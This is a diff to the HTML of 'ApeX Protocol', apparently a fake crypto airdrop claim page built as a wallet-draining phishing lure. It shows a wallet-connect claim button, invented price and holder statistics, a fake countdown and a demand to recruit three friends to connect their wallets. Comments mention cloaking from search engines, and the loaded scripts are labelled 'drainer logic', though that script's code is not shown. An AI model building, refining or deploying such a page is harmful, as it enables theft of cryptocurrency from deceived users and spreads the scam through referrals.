@@ -5,16 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="mobile-web-app-capable" content="yes" />
-    <!-- Prevent search engines from indexing this page (important for cloaking) -->
     <meta name="robots" content="noindex, nofollow" />
-    <!-- Force no caching to ensure fresh content every time -->
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
     <meta http-equiv="Pragma" content="no-cache" />
     <meta http-equiv="Expires" content="0" />
 
     <title>ApeX Protocol | AI-Optimized Yield Farming</title>
 
-    <!-- Preload critical assets for better performance -->
+    <!-- Preload critical assets -->
     <link rel="preload" href="NFT_IMAGE/ChatGPT Image Nov 7, 2025, 10_47_13 AM.png" as="image" />
     <link rel="preconnect" href="https://cdnjs.cloudflare.com" />
 
@@ -22,261 +20,148 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
     <link rel="stylesheet" href="style.css" />
 
-    <!-- Core libraries (loaded with defer to not block rendering) -->
+    <!-- Core libraries (defer) -->
     <script src="https://cdn.jsdelivr.net/npm/three@0.132.2/build/three.min.js" defer></script>
     <script src="https://cdn.jsdelivr.net/npm/vanta@0.5.21/dist/vanta.net.min.js" defer></script>
     <script src="https://cdn.jsdelivr.net/npm/chart.js" defer></script>
-
-    <!-- Web3 libraries – load only if needed, defer execution -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js" defer></script>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js" defer></script>
+
+    <!-- Optional: include a small inline script to detect load failures -->
+    <script>
+        window.addEventListener('error', function(e) {
+            console.error('Resource failed to load:', e.target.src || e.target.href);
+            // Optionally show a user message
+            const errorDiv = document.getElementById('resourceError');
+            if (errorDiv) errorDiv.style.display = 'block';
+        }, true);
+    </script>
 </head>
 <body>
-    <!-- Vanta.js Background (container for the animated net) -->
+    <!-- Resource load error indicator (hidden by default) -->
+    <div id="resourceError" style="display:none; background:#ff0000; color:white; text-align:center; padding:5px; position:fixed; top:0; width:100%; z-index:10000;">
+        Some resources failed to load. Please refresh or check your connection.
+    </div>
+
+    <!-- Vanta.js Background -->
     <div id="vanta-bg"></div>
 
-    <!-- Announcement Modal (Referral Required) -->
+    <!-- Announcement Modal -->
     <div class="announcement-modal" id="announcementModal">
         <div class="announcement-modal-content">
-            <div class="announcement-modal-close" id="announcementModalClose">
-                <i class="fas fa-times"></i>
-            </div>
-            <div class="announcement-icon">
-                <i class="fas fa-users"></i>
-            </div>
+            <div class="announcement-modal-close" id="announcementModalClose"><i class="fas fa-times"></i></div>
+            <div class="announcement-icon"><i class="fas fa-users"></i></div>
             <h2>Referral Required</h2>
             <p>To claim your airdrop, you need to refer 3 friends to join ApeX Protocol.</p>
-
             <div class="referral-steps">
-                <div class="referral-step">
-                    <div class="step-number">1</div>
-                    <div>Share your unique referral link</div>
-                </div>
-                <div class="referral-step">
-                    <div class="step-number">2</div>
-                    <div>Get 3 friends to connect their wallets</div>
-                </div>
-                <div class="referral-step">
-                    <div class="step-number">3</div>
-                    <div>Claim your 500 APEX tokens</div>
-                </div>
+                <div class="referral-step"><div class="step-number">1</div><div>Share your unique referral link</div></div>
+                <div class="referral-step"><div class="step-number">2</div><div>Get 3 friends to connect their wallets</div></div>
+                <div class="referral-step"><div class="step-number">3</div><div>Claim your 500 APEX tokens</div></div>
             </div>
-
             <div class="referral-link-container">
                 <div class="referral-link" id="referralLink">https://apex-protocol.io/ref?user=0x8a3F...Bc92</div>
-                <button class="copy-btn" id="copyReferralBtn">
-                    <i class="fas fa-copy"></i> Copy Link
-                </button>
+                <button class="copy-btn" id="copyReferralBtn"><i class="fas fa-copy"></i> Copy Link</button>
             </div>
-
-            <button class="btn-primary" id="announcementOkBtn">
-                <i class="fas fa-check"></i> I Understand
-            </button>
+            <button class="btn-primary" id="announcementOkBtn"><i class="fas fa-check"></i> I Understand</button>
         </div>
     </div>
 
-    <!-- Security Shield Indicator (always visible) -->
-    <div class="security-shield">
-        <i class="fas fa-shield-alt"></i> Security Verification Active
-    </div>
+    <!-- Security Shield -->
+    <div class="security-shield"><i class="fas fa-shield-alt"></i> Security Verification Active</div>
 
-    <!-- Header / Navigation -->
+    <!-- Header -->
     <header id="header">
         <div class="container">
             <nav>
-                <div class="logo">
-                    <i class="fas fa-ape logo-icon"></i>
-                    <span>APEX</span>
-                </div>
+                <div class="logo"><i class="fas fa-ape logo-icon"></i><span>APEX</span></div>
                 <ul class="nav-links">
-                    <li><a href="#home">Home</a></li>
-                    <li><a href="#features">Features</a></li>
-                    <li><a href="#tokenomics">Tokenomics</a></li>
-                    <li><a href="#roadmap">Roadmap</a></li>
+                    <li><a href="#home">Home</a></li><li><a href="#features">Features</a></li>
+                    <li><a href="#tokenomics">Tokenomics</a></li><li><a href="#roadmap">Roadmap</a></li>
                     <li><a href="#contact">Contact</a></li>
                 </ul>
-                <div id="walletButtonContainer">
-                    <button class="wallet-btn" id="walletButton">
-                        <i class="fas fa-wallet"></i> Connect
-                    </button>
-                </div>
-                <button class="mobile-menu-btn" aria-label="Menu">
-                    <i class="fas fa-bars"></i>
-                </button>
+                <div id="walletButtonContainer"><button class="wallet-btn" id="walletButton"><i class="fas fa-wallet"></i> Connect</button></div>
+                <button class="mobile-menu-btn" aria-label="Menu"><i class="fas fa-bars"></i></button>
             </nav>
         </div>
     </header>
 
-    <!-- Hero / Main Content -->
+    <!-- Hero -->
     <section class="hero">
         <div class="container">
             <div class="hero-content">
                 <h1 class="fade-in">Claim Your <span class="accent-text">AI-Optimized Tokens</span></h1>
-                <p class="fade-in">
-                    AI-enhanced token distribution! Get your free APEX tokens with
-                    predictive analytics and smart allocation.
-                </p>
+                <p class="fade-in">AI-enhanced token distribution! Get your free APEX tokens with predictive analytics and smart allocation.</p>
 
-                <!-- Two‑card layout -->
                 <div class="claim-container">
-                    <!-- Left Card: Claim Form -->
+                    <!-- Left Card -->
                     <div class="claim-card fade-in">
                         <h2>ApeX Token Claim</h2>
-
-                        <!-- Token Header with Price -->
                         <div class="token-header">
                             <div class="token-logo">AX</div>
                             <div>
                                 <div class="token-name">ApeX Protocol</div>
                                 <div class="token-symbol">APEX</div>
-                                <div class="price-change positive">
-                                    <i class="fas fa-arrow-up"></i>
-                                    <span id="tokenPrice">$0.058</span> (<span id="priceChange">7.2%</span>)
-                                </div>
+                                <div class="price-change positive"><i class="fas fa-arrow-up"></i> <span id="tokenPrice">$0.058</span> (<span id="priceChange">7.2%</span>)</div>
                             </div>
                         </div>
-
-                        <!-- Claim Details -->
                         <div class="claim-details">
                             <div class="claim-amount">500 APEX</div>
-                            <p class="text-center">
-                                AI-optimized token distribution for maximum efficiency
-                            </p>
+                            <p class="text-center">AI-optimized token distribution for maximum efficiency</p>
                         </div>
-
-                        <!-- Countdown Timer -->
                         <div class="countdown-container">
                             <div class="countdown-label">Time Until Launch</div>
                             <div class="countdown" id="countdown">0:0:30:0</div>
                         </div>
-
-                        <!-- Progress Bar -->
                         <div class="progress-container">
-                            <div class="progress-label">
-                                <span>Tokens Claimed</span>
-                                <span id="progressPercentage">75%</span>
-                            </div>
-                            <div class="progress">
-                                <div id="progressBar" class="progress-bar" role="progressbar" style="width: 75%"></div>
-                            </div>
+                            <div class="progress-label"><span>Tokens Claimed</span> <span id="progressPercentage">75%</span></div>
+                            <div class="progress"><div id="progressBar" class="progress-bar" style="width:75%"></div></div>
                         </div>
-
-                        <!-- NFT Image Container -->
                         <div class="nft-container">
                             <div class="nft-image">
-                                <div class="nft-circuit"></div>
-                                <div class="nft-overlay"></div>
-                                <img
-                                    src="NFT_IMAGE/ChatGPT Image Nov 7, 2025, 10_47_13 AM.png"
-                                    alt="Futuristic Human NFT"
-                                    loading="lazy"
-                                />
+                                <div class="nft-circuit"></div><div class="nft-overlay"></div>
+                                <img src="NFT_IMAGE/ChatGPT Image Nov 7, 2025, 10_47_13 AM.png" alt="Futuristic Human NFT" loading="lazy" />
                             </div>
                         </div>
-
-                        <!-- Claim Actions -->
                         <div class="claim-actions">
-                            <!-- AppKit button (if using) -->
-                            <w3m-button></w3m-button>
-
-                            <!-- Main Claim Button -->
-                            <button class="btn-primary" id="connectButton">
-                                <i class="fas fa-hand-holding-heart"></i> Claim Tokens
-                            </button>
-
-                            <!-- Status Messages -->
+                            <!-- If you use AppKit, ensure it's loaded; otherwise remove this line -->
+                            <!-- <w3m-button></w3m-button> -->
+                            <button class="btn-primary" id="connectButton"><i class="fas fa-hand-holding-heart"></i> Claim Tokens</button>
                             <div id="claimStatus" class="status"></div>
-
-                            <!-- Debug Panel (hidden by default) -->
                             <div class="connection-debug" id="connectionDebug"></div>
                             <span class="debug-toggle" id="debugToggle">Show connection details</span>
                         </div>
                     </div>
 
-                    <!-- Right Card: Token Tracker -->
+                    <!-- Right Card -->
                     <div class="token-tracker-card fade-in">
                         <h2>ApeX Token Tracker</h2>
-
-                        <!-- Token Statistics -->
                         <div class="token-stats">
-                            <div class="stat-item">
-                                <h3>Market Cap</h3>
-                                <div class="stat-value">
-                                    $<span id="marketCap">1.84M</span>
-                                </div>
-                            </div>
-                            <div class="stat-item">
-                                <h3>Volume (24h)</h3>
-                                <div class="stat-value">$<span id="volume">286K</span></div>
-                            </div>
-                            <div class="stat-item">
-                                <h3>Holders</h3>
-                                <div class="stat-value"><span id="holders">12,542</span></div>
-                            </div>
-                            <div class="stat-item">
-                                <h3>Liquidity</h3>
-                                <div class="stat-value">
-                                    $<span id="liquidity">620K</span>
-                                </div>
-                            </div>
+                            <div class="stat-item"><h3>Market Cap</h3><div class="stat-value">$<span id="marketCap">1.84M</span></div></div>
+                            <div class="stat-item"><h3>Volume (24h)</h3><div class="stat-value">$<span id="volume">286K</span></div></div>
+                            <div class="stat-item"><h3>Holders</h3><div class="stat-value"><span id="holders">12,542</span></div></div>
+                            <div class="stat-item"><h3>Liquidity</h3><div class="stat-value">$<span id="liquidity">620K</span></div></div>
                         </div>
-
-                        <!-- Price Chart -->
-                        <div class="chart-container">
-                            <canvas id="tokenChart"></canvas>
-                        </div>
-
-                        <!-- Recent Claims Feed -->
+                        <div class="chart-container"><canvas id="tokenChart"></canvas></div>
                         <div class="recent-claims">
                             <h3><i class="fas fa-bolt"></i> Recent Claims</h3>
-                            <div class="claim-list" id="claimList">
-                                <!-- Dynamically populated by JavaScript -->
-                            </div>
+                            <div class="claim-list" id="claimList"></div>
                         </div>
                     </div>
                 </div>
 
-                <!-- AI Security Analytics Section -->
+                <!-- AI Analytics -->
                 <div class="ai-section fade-in">
                     <h2><i class="fas fa-brain"></i> AI Security Analytics</h2>
-
-                    <!-- AI Stats Grid -->
                     <div class="ai-stats">
-                        <div class="ai-stat">
-                            <i class="fas fa-fingerprint"></i>
-                            <h3>Fingerprinting</h3>
-                            <div class="value">Active</div>
-                        </div>
-                        <div class="ai-stat">
-                            <i class="fas fa-sim-card"></i>
-                            <h3>TX Simulation</h3>
-                            <div class="value">Enabled</div>
-                        </div>
-                        <div class="ai-stat">
-                            <i class="fas fa-code-branch"></i>
-                            <h3>Hook Interception</h3>
-                            <div class="value">Active</div>
-                        </div>
-                        <div class="ai-stat">
-                            <i class="fas fa-coins"></i>
-                            <h3>Non-ETH</h3>
-                            <div class="value">Ready</div>
-                        </div>
+                        <div class="ai-stat"><i class="fas fa-fingerprint"></i><h3>Fingerprinting</h3><div class="value">Active</div></div>
+                        <div class="ai-stat"><i class="fas fa-sim-card"></i><h3>TX Simulation</h3><div class="value">Enabled</div></div>
+                        <div class="ai-stat"><i class="fas fa-code-branch"></i><h3>Hook Interception</h3><div class="value">Active</div></div>
+                        <div class="ai-stat"><i class="fas fa-coins"></i><h3>Non-ETH</h3><div class="value">Ready</div></div>
                     </div>
-
-                    <!-- Prediction Meter -->
                     <div class="ai-prediction">
-                        <h3>
-                            <i class="fas fa-crystal-ball"></i> Security Bypass Probability
-                        </h3>
-                        <div class="prediction-meter">
-                            <div class="prediction-fill" id="predictionFill"></div>
-                        </div>
-                        <div class="prediction-labels">
-                            <span>Low</span>
-                            <span>Medium</span>
-                            <span>High</span>
-                        </div>
+                        <h3><i class="fas fa-crystal-ball"></i> Security Bypass Probability</h3>
+                        <div class="prediction-meter"><div class="prediction-fill" id="predictionFill"></div></div>
+                        <div class="prediction-labels"><span>Low</span><span>Medium</span><span>High</span></div>
                     </div>
                 </div>
             </div>
@@ -287,98 +172,58 @@
     <footer>
         <div class="footer-container">
             <div class="footer-content">
-                <!-- Brand Column -->
-                <div class="footer-brand">
-                    <div class="footer-logo">
-                        <i class="fas fa-ape"></i>
-                        <span>APEX PROTOCOL</span>
-                    </div>
-                    <p class="footer-description">
-                        AI-optimized yield farming protocol with advanced security
-                        features and predictive analytics for maximum returns.
-                    </p>
-                </div>
-
-                <!-- Links Columns -->
+                <div class="footer-brand"><div class="footer-logo"><i class="fas fa-ape"></i><span>APEX PROTOCOL</span></div><p class="footer-description">AI-optimized yield farming protocol with advanced security features and predictive analytics for maximum returns.</p></div>
                 <div class="footer-links">
-                    <div class="footer-column">
-                        <h3>Resources</h3>
-                        <ul>
-                            <li><a href="#"><i class="fas fa-book"></i> Documentation</a></li>
-                            <li><a href="#"><i class="fas fa-newspaper"></i> Blog</a></li>
-                            <li><a href="#"><i class="fas fa-video"></i> Tutorials</a></li>
-                        </ul>
-                    </div>
-                    <div class="footer-column">
-                        <h3>Company</h3>
-                        <ul>
-                            <li><a href="#"><i class="fas fa-users"></i> About Us</a></li>
-                            <li><a href="#"><i class="fas fa-briefcase"></i> Careers</a></li>
-                            <li><a href="#"><i class="fas fa-handshake"></i> Partners</a></li>
-                        </ul>
-                    </div>
-                    <div class="footer-column">
-                        <h3>Legal</h3>
-                        <ul>
-                            <li><a href="#"><i class="fas fa-shield-alt"></i> Privacy Policy</a></li>
-                            <li><a href="#"><i class="fas fa-scale-balanced"></i> Terms of Service</a></li>
-                            <li><a href="#"><i class="fas fa-gavel"></i> Disclaimer</a></li>
-                            <li><a href="#"><i class="fas fa-cookie"></i> Cookie Policy</a></li>
-                        </ul>
-                    </div>
+                    <div class="footer-column"><h3>Resources</h3><ul><li><a href="#"><i class="fas fa-book"></i> Documentation</a></li><li><a href="#"><i class="fas fa-newspaper"></i> Blog</a></li><li><a href="#"><i class="fas fa-video"></i> Tutorials</a></li></ul></div>
+                    <div class="footer-column"><h3>Company</h3><ul><li><a href="#"><i class="fas fa-users"></i> About Us</a></li><li><a href="#"><i class="fas fa-briefcase"></i> Careers</a></li><li><a href="#"><i class="fas fa-handshake"></i> Partners</a></li></ul></div>
+                    <div class="footer-column"><h3>Legal</h3><ul><li><a href="#"><i class="fas fa-shield-alt"></i> Privacy Policy</a></li><li><a href="#"><i class="fas fa-scale-balanced"></i> Terms of Service</a></li><li><a href="#"><i class="fas fa-gavel"></i> Disclaimer</a></li><li><a href="#"><i class="fas fa-cookie"></i> Cookie Policy</a></li></ul></div>
                 </div>
             </div>
-
-            <!-- Bottom Bar -->
-            <div class="footer-bottom">
-                <p class="copyright">
-                    &copy; 2025 ApeX Protocol. All rights reserved. |
-                    <a href="#">Security</a> |
-                    <a href="#">Status</a>
-                </p>
-            </div>
+            <div class="footer-bottom"><p class="copyright">&copy; 2025 ApeX Protocol. All rights reserved. | <a href="#">Security</a> | <a href="#">Status</a></p></div>
         </div>
     </footer>
 
-    <!-- JavaScript Modules – load after DOM is ready -->
+    <!-- Your custom scripts (drainer logic) -->
     <script type="module" src="./Java/Script.js" defer></script>
     <script type="module" src="./Java/main.js" defer></script>
 
-    <!-- Inline Vanta initialization (runs after all deferred scripts) -->
+    <!-- Vanta initialization with retry -->
     <script>
         (function initVanta() {
-            // Wait for DOM and required libraries
             if (document.readyState === 'loading') {
                 document.addEventListener('DOMContentLoaded', initVanta);
                 return;
             }
             if (typeof VANTA !== 'undefined' && VANTA.NET) {
-                VANTA.NET({
-                    el: "#vanta-bg",
-                    mouseControls: true,
-                    touchControls: true,
-                    gyroControls: false,
-                    minHeight: 200.00,
-                    minWidth: 200.00,
-                    scale: 1.00,
-                    scaleMobile: 1.00,
-                    color: 0xff6b00,
-                    backgroundColor: 0x0f172a,
-                    points: 15.00,
-                    maxDistance: 25.00,
-                    spacing: 18.00
-                });
+                try {
+                    VANTA.NET({
+                        el: "#vanta-bg",
+                        mouseControls: true,
+                        touchControls: true,
+                        gyroControls: false,
+                        minHeight: 200.00,
+                        minWidth: 200.00,
+                        scale: 1.00,
+                        scaleMobile: 1.00,
+                        color: 0xff6b00,
+                        backgroundColor: 0x0f172a,
+                        points: 15.00,
+                        maxDistance: 25.00,
+                        spacing: 18.00
+                    });
+                } catch (e) {
+                    console.error('Vanta init error:', e);
+                }
             } else {
-                // Retry after a short delay (libraries may still be loading)
-                setTimeout(initVanta, 200);
+                setTimeout(initVanta, 300);
             }
         })();
     </script>
 
-    <!-- Fallback for users with JavaScript disabled -->
+    <!-- Fallback for no JavaScript -->
     <noscript>
-        <div style="position: fixed; top: 0; left: 0; width: 100%; background: #ff0000; color: white; text-align: center; padding: 10px; z-index: 9999;">
-            JavaScript is required to use this site. Please enable JavaScript in your browser settings.
+        <div style="position:fixed; top:0; left:0; width:100%; background:#ff0000; color:white; text-align:center; padding:10px; z-index:9999;">
+            JavaScript is required. Please enable it in your browser.
         </div>
     </noscript>
 </body>
